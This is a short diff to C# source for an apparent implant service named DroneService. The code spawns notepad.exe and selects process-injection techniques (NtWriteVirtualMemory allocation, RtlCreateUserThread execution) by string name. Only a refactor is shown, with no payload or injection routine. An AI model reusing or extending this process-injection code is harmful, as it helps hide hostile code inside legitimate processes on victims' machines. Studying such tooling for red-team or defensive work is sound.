@@ -4,7 +4,7 @@ using System.Linq;
 using System.ServiceProcess;
 using System.Threading;
 
-using DroneService.DynamicInvocation.Injection;
+using DroneService.Invocation.Injection;
 
 namespace DroneService
 {
@@ -23,10 +23,10 @@ namespace DroneService
             var self = System.Reflection.Assembly.GetExecutingAssembly();
             var types = self.GetTypes();
 
-            var alloc = (from type in types where type == Allocation
+            var alloc = (from type in types where type.Name.Equals(Allocation)
                 select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
             
-            var exec = (from type in types where type == Execution
+            var exec = (from type in types where type.Name.Equals(Execution)
                 select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
             
             var process = Process.Start(SpawnTo);
@@ -39,7 +39,7 @@ namespace DroneService
         }
 
         private static string SpawnTo => @"C:\Windows\System32\notepad.exe";
-        private static Type Allocation => typeof(NtWriteVirtualMemory);
-        private static Type Execution => typeof(RtlCreateUserThread);
+        private static string Allocation => "NtWriteVirtualMemory";
+        private static string Execution => "RtlCreateUserThread";
     }
 }
